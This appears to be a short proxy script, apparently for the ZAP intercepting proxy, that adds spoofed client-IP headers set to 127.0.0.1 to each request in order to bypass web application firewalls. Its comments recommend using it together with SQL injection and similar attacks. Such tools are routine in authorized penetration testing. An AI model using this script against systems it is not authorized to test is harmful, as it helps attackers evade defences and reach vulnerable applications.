// This script allows you to inject headers your requests that can under some
// conditions allow you to bypass WAF devices.
// You may need to change the IP addresses for known internal ones, if not defaults may work.
// This script is best used in conjunction with SQLi or other such attacks.
 

function proxyRequest(msg) {
	msg.getRequestHeader().setHeader('X-Forward-For', "127.0.0.1")
	msg.getRequestHeader().setHeader('X-Remote-IP', "127.0.0.1")
	msg.getRequestHeader().setHeader('X-Originating-IP', "127.0.0.1")
	msg.getRequestHeader().setHeader('X-Remote-Addr', "127.0.0.1")
	msg.getRequestHeader().setHeader('X-Remote-IP', "127.0.0.1")
	return true
}

function proxyResponse(msg) {
	// Leave the response alone
	return true
}
